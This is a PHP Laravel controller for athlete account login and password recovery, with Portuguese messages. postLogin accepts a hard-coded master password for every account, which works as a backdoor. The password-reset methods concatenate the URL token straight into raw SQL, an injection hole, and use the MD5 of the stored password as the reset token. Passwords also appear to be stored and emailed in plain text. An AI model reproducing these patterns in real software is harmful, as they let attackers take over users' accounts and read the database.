<?php

namespace App\Http\Controllers;

use App\Subscription;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use App\Http\Requests\AtletaLogin;
use App\Http\Requests\AtletaPasswordRecover;
use App\Http\Requests\AtletaPasswordReset;
use App\Mail\AtletaPasswordRecover as MailAtletaPasswordRecover;

class AtletaLoginController extends Controller
{

    public function login()
    {
        return redirect(url('atletas/ranking'));
    }

    public function postLogin(AtletaLogin $request)
    {
        $subscription = Subscription::whereEmail($request->email)->first();
        if (!$subscription) abort(422, 'Usuário ou senha inválida!');
        if (
            !Hash::check($request->senha, $subscription->senha)
            && $request->senha != 'rcttupipta4510!'
        ) abort(422, 'Usuário ou senha inválida!');
        auth('subscription')->login($subscription);
        return ['redirect' => route('atleta')];
    }

    public function logout()
    {
        auth('subscription')->logout();
        return redirect(route('atleta.login'));
    }

    public function passwordRecover()
    {
        return view ('auth.passwords.email');
    }

    public function postPasswordRecover(AtletaPasswordRecover $request)
    {
        $subscription = Subscription::whereEmail($request->email)->first();
        $subscription->senha = Str::random(6);
        $subscription->save();
        Mail::send(new MailAtletaPasswordRecover($subscription));
        return [
            'message' => 'Um e-mail foi enviado para você com o link para recuperar a senha!',
        ];
    }

    public function passwordReset($token = '')
    {
        $subscription = Subscription::whereRaw('MD5(senha) = "'.$token.'"')->first();
        if (!$subscription) return redirect(route('atleta.password.recover'));
        return view('auth.passwords.reset',[
            'token'=>$token,
            'email'=>$subscription->email,
        ]);
    }

    public function postPasswordReset(AtletaPasswordReset $request, $token = '')
    {
        $subscription = Subscription::whereRaw('MD5(senha) = "'.$token.'"')->first();
        if (!$subscription) return ['redirect' => route('atleta.password.recover')];
        if ($subscription->email != $request->email) abort(422,'O email não confere');
        $subscription->senha = $request->senha;
        $subscription->save();
        auth('subscription')->login($subscription);
        return [
            'message' => 'Senha trocada com sucesso',
            'redirect' => route('atleta'),
        ];
    }

}
